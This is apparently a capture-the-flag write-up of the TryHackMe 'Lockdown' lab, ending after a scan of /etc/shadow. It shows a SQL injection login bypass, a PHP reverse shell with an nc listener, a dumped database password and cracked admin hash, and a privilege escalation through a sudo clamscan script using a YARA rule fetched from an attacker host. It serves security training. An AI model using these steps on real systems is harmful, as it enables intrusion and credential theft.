<p>July 12, 2025 - Day 432</p>
<h1>Lockdown</h1>
<p>Stay at 127.0.0.1. Wear a 255.255.255.0.<br>
https://tryhackme.com/room/lockdown</p>

<img width="1920" height="172" alt="image" src="https://github.com/user-attachments/assets/aeaeb9d1-1161-4052-9b74-89af6ce714a1" />


<br>
<br>

<h3>nmap</h3>

```bash
:/Lockdown# nmap -sC -sV -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Coronavirus Contact Tracer
```

<h3>TargetIP</h3>

<img width="1033" height="265" alt="image" src="https://github.com/user-attachments/assets/166a7b02-8694-4272-8b6f-3bc5bc5ddc55" />

<h3>/etc/hosts</h3>

```bash
TargetIP   contacttracer.thm
```

<h3>gobuster</h3>

```bash
:~/Lockdown# gobuster dir -u http://contacttracer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 60
...
http://contacttracer.thm/uploads              (Status: 301) [Size: 324] [--> http://contacttracer.thm/uploads/]
http://contacttracer.thm/admin                (Status: 301) [Size: 322] [--> http://contacttracer.thm/admin/]
http://contacttracer.thm/plugins              (Status: 301) [Size: 324] [--> http://contacttracer.thm/plugins/]
http://contacttracer.thm/classes              (Status: 301) [Size: 324] [--> http://contacttracer.thm/classes/]
http://contacttracer.thm/temp                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/temp/]
http://contacttracer.thm/dist                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/dist/]
http://contacttracer.thm/inc                  (Status: 301) [Size: 320] [--> http://contacttracer.thm/inc/]
http://contacttracer.thm/build                (Status: 301) [Size: 322] [--> http://contacttracer.thm/build/]
http://contacttracer.thm/libs                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/libs/]
http://contacttracer.thm/server-status        (Status: 403) [Size: 282]
Progress: 218275 / 218276 (100.00%)
```

<h3>dirb</h3>

```bash
:~/Lockdown# dirb http://contacttracer.thm/
...
URL_BASE: http://contacttracer.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://contacttracer.thm/ ----
==> DIRECTORY: http://contacttracer.thm/admin/                                                                                                                      
==> DIRECTORY: http://contacttracer.thm/build/                                                                                                                      
==> DIRECTORY: http://contacttracer.thm/classes/                                                                                                                    
==> DIRECTORY: http://contacttracer.thm/dist/                                                                                                                       
==> DIRECTORY: http://contacttracer.thm/inc/                                                                                                                        
+ http://contacttracer.thm/index.php (CODE:200|SIZE:17762)                                                                                                          
==> DIRECTORY: http://contacttracer.thm/libs/                                                                                                                       
==> DIRECTORY: http://contacttracer.thm/plugins/                                                                                                                    
+ http://contacttracer.thm/server-status (CODE:403|SIZE:282)                                                                                                        
==> DIRECTORY: http://contacttracer.thm/temp/                                                                                                                       
==> DIRECTORY: http://contacttracer.thm/uploads/                                                                                                                    
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/ ----
==> DIRECTORY: http://contacttracer.thm/admin/city/                                                                                                                 
==> DIRECTORY: http://contacttracer.thm/admin/inc/                                                                                                                  
+ http://contacttracer.thm/admin/index.php (CODE:200|SIZE:21734)                                                                                                    
==> DIRECTORY: http://contacttracer.thm/admin/people/                                                                                                               
==> DIRECTORY: http://contacttracer.thm/admin/reports/                                                                                                              
==> DIRECTORY: http://contacttracer.thm/admin/state/                                                                                                                
==> DIRECTORY: http://contacttracer.thm/admin/user/                                                                                                                 
==> DIRECTORY: http://contacttracer.thm/admin/zone/                                                                                                                 
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/build/ ----
==> DIRECTORY: http://contacttracer.thm/build/config/                                                                                                               
==> DIRECTORY: http://contacttracer.thm/build/js/                                                                                                                   
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/classes/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/ ----
==> DIRECTORY: http://contacttracer.thm/dist/css/                                                                                                                   
==> DIRECTORY: http://contacttracer.thm/dist/img/                                                                                                                   
==> DIRECTORY: http://contacttracer.thm/dist/js/                                                                                                                    
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/inc/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/libs/ ----
==> DIRECTORY: http://contacttracer.thm/libs/css/                                                                                                                   
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/plugins/ ----
==> DIRECTORY: http://contacttracer.thm/plugins/jquery/                                                                                                             
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/temp/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/uploads/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/city/ ----
+ http://contacttracer.thm/admin/city/index.php (CODE:500|SIZE:0)                                                                                                   
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/inc/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/people/ ----
+ http://contacttracer.thm/admin/people/index.php (CODE:500|SIZE:0)                                                                                                 
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/reports/ ----
+ http://contacttracer.thm/admin/reports/index.php (CODE:500|SIZE:466)                                                                                              
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/state/ ----
+ http://contacttracer.thm/admin/state/index.php (CODE:500|SIZE:0)                                                                                                  
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/user/ ----
+ http://contacttracer.thm/admin/user/index.php (CODE:500|SIZE:0)                                                                                                   
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/admin/zone/ ----
+ http://contacttracer.thm/admin/zone/index.php (CODE:500|SIZE:0)                                                                                                   
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/build/config/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/build/js/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/css/ ----
==> DIRECTORY: http://contacttracer.thm/dist/css/alt/                                                                                                               
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/img/ ----
==> DIRECTORY: http://contacttracer.thm/dist/img/credit/                                                                                                            
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/js/ ----
==> DIRECTORY: http://contacttracer.thm/dist/js/pages/                                                                                                              
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/libs/css/ ----
+ http://contacttracer.thm/libs/css/index.php (CODE:200|SIZE:0)                                                                                                     
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/plugins/jquery/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/css/alt/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/img/credit/ ----
                                                                                                                                                                    
---- Entering directory: http://contacttracer.thm/dist/js/pages/ ----

```

<h3>contacttracer.thm/admin/login.php</h3>

<img width="1024" height="317" alt="image" src="https://github.com/user-attachments/assets/532286e0-221e-412e-af0f-5a4d4ace3470" />

<h3>'or 1=1-- -</h3>

<img width="1053" height="376" alt="image" src="https://github.com/user-attachments/assets/4e7bcb5f-734a-450d-be24-4d9f5d02334f" />

<h3>contacttracer.thm/admin/?page=user</h3>

<img width="1051" height="615" alt="image" src="https://github.com/user-attachments/assets/df7f5d65-bf3f-4abd-b387-195c8d6d49eb" />

<h3>contacttracer.thm/admin/?page=system_info</h3>

<img width="1049" height="616" alt="image" src="https://github.com/user-attachments/assets/ab233b89-40de-4cfb-a9b2-fe915bdbdcd7" />

<h3>Uploaded a php reverse shell</h3>

<img width="1048" height="619" alt="image" src="https://github.com/user-attachments/assets/8805f79f-b755-4a89-9e94-377e0321be27" />

<h3>contacttracer.thm</h3>
<p>
- right-clicked the image  
</p>

<img width="1038" height="271" alt="image" src="https://github.com/user-attachments/assets/8918e1e3-b68a-4084-a390-916c839d5970" />

<h3>shell</h3>

```bash
:~/Lockdown# nc -nlvp 6666
Listening on 0.0.0.0 6666
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-xx-xx-xxx-xxx:/$ ^Z
[1]+  Stopped                 nc -nlvp 6666
:~/Lockdown# stty raw -echo; fg
nc -nlvp 6666

www-data@ip-xx-xx-xxx-xxx::$ ls /home
cyrus  maxine  ssm-user  ubuntu
```


```bash
www-data@ip-xx-xx-xxx-xxx::/var/www/html$ ls
404.html   build       cts_qr_card.png	inc	   login.php  uploads
README.md  classes     dist		index.php  plugins
admin	   config.php  home.php		libs	   temp
www-data@ip-10-10-255-238:/var/www/html$ cd classes
www-data@ip-10-10-255-238:/var/www/html/classes$ ls
City.php	   Login.php   State.php	   Users.php
DBConnection.php   Main.php    SystemSettings.php  Zone.php
Establishment.php  People.php  TEST.php
```

```bash
www-data@ip-xx-xx-xxx-xxx:/var/www/html/classes$ cat DBConnection.php
<?php
class DBConnection{

    private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
    private $database = 'cts_db';
...
```

```bash
www-data@ip-xx-xx-xxx-xxx::/var/www/html/classes$ mysql -u cts -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 324
...
mysql>
```


```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| cts_db             |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use cts_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
Database changed
mysql> show tables;
+------------------+
| Tables_in_cts_db |
+------------------+
| barangay_list    |
| city_list        |
| establishment    |
| people           |
| state_list       |
| system_info      |
| tracks           |
| users            |
+------------------+
8 rows in set (0.00 sec)

mysql> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
www-data@ip-xx-xx-xxx-xxx::/var/www/html/classes$
```

<h3>CrackStation</h3>
<P>sweetpandemonium</P>

<img width="1340" height="532" alt="image" src="https://github.com/user-attachments/assets/ee7d5117-cc34-4412-9356-c94710c4470d" />


```bash
www-data@ip-xx-xx-xxx-xxx::/home$ su maxine
Password: 
su: Authentication failure
www-data@ip-xx-xx-xxx-xxx::/home$ su cyrus  
Password: 
cyrus@ip-xx-xx-xxx-xxx:~$ ls -la
total 48
drwxr-x--- 6 cyrus cyrus 4096 Jul 30  2021 .
drwxr-xr-x 6 root  root  4096 Jul 10 18:31 ..
-rw------- 1 cyrus cyrus   56 Jul 30  2021 .bash_history
-rw-r--r-- 1 cyrus cyrus  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cyrus cyrus 3771 Apr  4  2018 .bashrc
drwx------ 2 cyrus cyrus 4096 May 10  2021 .cache
drwx------ 3 cyrus cyrus 4096 May 10  2021 .gnupg
-rw-r--r-- 1 cyrus cyrus  807 Apr  4  2018 .profile
drwxr-x--- 2 cyrus cyrus 4096 Jul 30  2021 quarantine
drwx------ 2 cyrus cyrus 4096 May 10  2021 .ssh
-rwxr-x--- 1 cyrus cyrus   69 May 11  2021 testvirus
-r--r----- 1 cyrus cyrus   38 May 11  2021 user.txt
cyrus@ip-xx-xx-xxx-xxx:~$ cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
```

<p>Identified <code>testvirus</code> and <code>quarantine</code></p>

<br>

```bash
cyrus@ip-xx-xx-xxx-xxx::~$ sudo -l
[sudo] password for cyrus: 
Matching Defaults entries for cyrus on ip-xx-xx-xxx-xxx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on ip-xx-xx-xxx-xxx:
    (root) /opt/scan/scan.sh
```

```bash
cyrus@ip-xx-xx-xxx-xxx:~$ cat /opt/scan/scan.sh
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

```bash
cyrus@ip-xx-xx-xxx-xxx:/var/lib/clamav$ ls -la
total 367632
drwxrwxrwx  3 clamav clamav      4096 Jul 13 01:41 .
drwxr-xr-x 52 root   root        4096 Jul  5 14:12 ..
-rw-r--r--  1 clamav clamav    284179 Jul  5 14:03 bytecode.cvd
-rw-r--r--  1 clamav clamav 205647360 Jul 10 18:31 daily.cld
-rw-r--r--  1 clamav clamav        69 Apr 26 23:18 freshclam.dat
-rw-r--r--  1 clamav clamav 170479789 Jul  5 14:03 main.cvd
-rw-r--r--  1 root   root          46 Jul 23  2021 main.hdb
-rw-r--r--  1 root   root          69 May 11  2021 mirrors.dat
drwxr-xr-x  3 clamav clamav      4096 Jul 13 
```

```bash
cyrus@ip-xx-xx-xxx-xxx:/var/lib/clamav$ rm main.hdb
rm: remove write-protected regular file 'main.hdb'? yes
cyrus@ip-xx-xx-xxx-xxx: curl http://AttackIP:8000/shadow.yar -o shadow.yar               
rule root
{
 strings:
  $s = "root"
 condition:
  $s
}
```

```bash
cyrus@ip-xx-xx-xxx-xxx:/var/lib/clamav$ sudo /opt/scan/scan.sh
Enter path: /etc/shadow



```
